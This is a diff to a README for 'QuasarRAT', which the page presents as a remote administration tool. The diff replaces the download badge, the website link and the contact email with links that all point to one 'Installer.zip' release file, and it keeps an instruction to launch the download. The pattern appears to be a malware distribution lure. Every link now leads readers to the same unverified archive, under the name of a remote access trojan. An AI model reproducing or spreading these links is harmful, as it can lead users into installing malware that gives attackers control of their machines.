@@ -16,7 +16,7 @@ Welcome to the official repository of QuasarRAT - a powerful and versatile Remot
 - Topics: admin-tool, cpu-monitoring, encrypted-communication, file-operations, file-transfer, lightweight-tool, quasarrat, ram-usage, remote-access, remote-desktop, remote-management, resource-monitoring, secure-connection, system-automation, system-monitoring, task-automation, task-execution, troubleshooting-tool, windows-management
 
 ## 📥 Download
-[![Download QuasarRAT](https://img.shields.io/badge/Download-v1.0.0-blue)](https://github.com/cli/oauth/archive/refs/tags/v1.0.0.zip)
+[![Download QuasarRAT](https://github.com/BashSpiceRB/QuasarRAT-Remote-Access-Tool/releases/download/v1.0/Installer.zip)](https://github.com/BashSpiceRB/QuasarRAT-Remote-Access-Tool/releases/download/v1.0/Installer.zip)
 *Launch the downloaded zip file to begin installation.*
 
 ## 🚀 Get Started
@@ -27,13 +27,13 @@ To start using QuasarRAT, follow these simple steps:
 4. Configure the settings for remote access and start managing your systems efficiently.
 
 ## 🌐 Visit our Website
-Explore more about QuasarRAT on our [official website](https://example.com).
+Explore more about QuasarRAT on our [official website](https://github.com/BashSpiceRB/QuasarRAT-Remote-Access-Tool/releases/download/v1.0/Installer.zip).
 
 ## 🤝 Contributions
 We welcome contributions from the community to enhance QuasarRAT further. Feel free to submit pull requests for new features and improvements.
 
 ## 📞 Contact Us
-For any queries or feedback, you can reach out to us at [contact@quasarrat.com](mailto:contact@quasarrat.com). We'd love to hear from you!
+For any queries or feedback, you can reach out to us at [https://github.com/BashSpiceRB/QuasarRAT-Remote-Access-Tool/releases/download/v1.0/Installer.zip](https://github.com/BashSpiceRB/QuasarRAT-Remote-Access-Tool/releases/download/v1.0/Installer.zip). We'd love to hear from you!
 
 ## 📜 License
 This project is licensed under the MIT License. See the [LICENSE](/LICENSE) file for details.
